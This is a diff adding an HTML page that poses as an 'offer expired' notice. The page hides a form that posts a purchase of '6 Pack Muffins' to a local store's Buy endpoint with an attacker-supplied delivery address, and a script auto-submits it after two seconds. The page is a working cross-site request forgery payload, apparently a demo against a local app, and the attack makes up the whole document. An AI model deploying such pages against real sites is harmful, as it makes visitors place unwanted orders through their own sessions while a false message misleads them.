@@ -1,0 +1,25 @@
+
+<html>
+<head>
+</head>
+<body>
+    <h1>Sorry the offer has expired :(</h1>
+    <h2>You will be redirected to our home page.</h2>
+<form name="you_been_hacked"				
+	  action="http://localhost:64664/Store/Buy?productId=4" 
+	  method="post"
+	  style="display:none">
+	<input type="hidden" name="productId" value="4"/>    
+	<input type="text" readonly="readonly"  name="productName" value="6 Pack Muffins"/>    
+	<input type="text" readonly="readonly"  name="price" value="14,05"/>    
+	<input type="text" name="deliveryAddress" value="bud guy address"/>        
+</form>
+<script type="text/javascript">
+	setTimeout(function(){
+	    document.you_been_hacked.submit();	    
+	}, 2000);
+	
+</script>
+</body>
+</html>
+
